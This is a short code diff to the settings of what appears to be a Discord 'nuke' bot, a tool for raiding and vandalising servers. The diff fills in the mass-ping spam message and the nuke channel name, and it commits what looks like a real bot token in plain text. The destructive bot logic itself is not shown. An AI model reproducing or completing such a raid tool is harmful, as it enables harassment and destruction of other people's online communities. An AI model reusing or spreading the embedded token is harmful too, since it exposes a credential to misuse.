@@ -8,11 +8,11 @@ import requests
 
 protected_servers = [1317760104182841394] # Add your id
 owner_ids = [745716142986756243] # Add your id
-nuke_message = "@everyone Your-Message" # Put your nuke message here
-nuke_channel_name = "Your-Channel" # Put your nuke channel name here
+nuke_message = "@everyone NGU" # Put your nuke message here
+nuke_channel_name = "NGU" # Put your nuke channel name here
 bot_prefix = "!"
 
-bot_token = ""
+bot_token = "MTMxNTM0MzcyMjA1NzE3NTA2MQ.Gvph38.fnaTYITE8LuflTdO3zs1pE24BxkWWvUfmNTHXY"
 
 # Below is the bot code, Just don't touch it unless you know what you're doing.
 
